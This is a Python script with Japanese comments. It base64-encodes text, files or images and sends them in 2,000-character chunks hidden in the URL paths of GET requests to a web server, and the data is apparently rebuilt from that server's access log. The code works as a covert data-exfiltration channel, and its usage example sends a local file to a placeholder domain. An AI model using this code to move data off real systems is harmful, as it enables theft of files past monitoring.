#アクセスログのパス、key,ファイル形式、出力ファイルパスを引数
import requests
from Base64Converter import Base64Converter

class SendMessageByGetRequest:
    def __init__(self):
        pass

    def main(self,data_or_data_path,data_type,domain,key):
        """
        data_or_data_path:テキストを送るだけであれば、string型のテキストを。その他の場合はファイルのパスを入力
        data_type:
          ・text
          ・text_file
          ・image
        domain:webサーバのドメイン
        key:送信するデータを識別するためのkey。string型で任意の文字列を入力
        """
        base64_converter = Base64Converter()
        if data_type == "text":
            base64_message = base64_converter.text_to_base64(data_or_data_path)
        if data_type == "text_file":
            base64_message = base64_converter.textfile_to_base64(data_or_data_path)
        if data_type == "image":
            base64_message = base64_converter.image_to_text(data_or_data_path)

        self.send_message_by_get_request(domain,base64_message,key)
        
    def send_message_by_get_request(self,domain,data,key):
        idx = 0
        while True:
            chunk_data = data[idx*2000:idx*2000+2000]
            url = "http://"+domain+"/"+key+"/"+chunk_data+"/"+key+"/"
            self._send_get_request(url)
            if len(data)<=idx*2000+2000:
                break
            else:
                idx+=1

    def _send_get_request(self,url,params=None):
        """HTTPのGETリクエストを送信し、レスポンスを返す関数"""
        try:
            response = requests.get(url, params=params)
            # 応答のステータスコードが200以外の場合はエラーメッセージを表示
            response.raise_for_status()
            return response.text
        except requests.exceptions.RequestException as e:
            print(e)
            return f"Error: {e}"

#Usage
ins = SendMessageByGetRequest()
domain = "your apache webserver domain or IP adoress"
text_file_path = "your/text/filepath.txt"
key = "test_key"  
ins.main(text_file_path,"text_file",domain,key)
#ins.main("image_file_path.png","image",domain,"test_key_for_image")
